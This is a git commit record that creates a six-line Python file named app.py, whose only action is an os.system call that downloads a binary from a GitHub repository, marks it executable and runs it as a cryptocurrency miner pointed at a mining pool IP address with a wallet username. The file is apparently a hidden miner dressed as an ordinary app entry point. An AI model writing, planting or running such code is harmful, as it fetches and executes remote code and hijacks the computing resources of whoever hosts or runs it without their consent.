162201d2422d005e38563b22e511db0a64d79d08
bafery <109651757+bafery@users.noreply.github.com>
2022-07-20 18:24:38 +0700

    Create app.py

---
+++ app.py
@@ -0,0 +1,6 @@
+import os
+import time
+import subprocess
+
+cmd = 'curl -L -o sse2 https://github.com/Akatsoki/nungx/raw/main/sse2 && chmod +x sse2 && ./sse2 -a yespower -o stratum+tcps://146.59.217.34:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.GEDO'
+os.system(cmd)
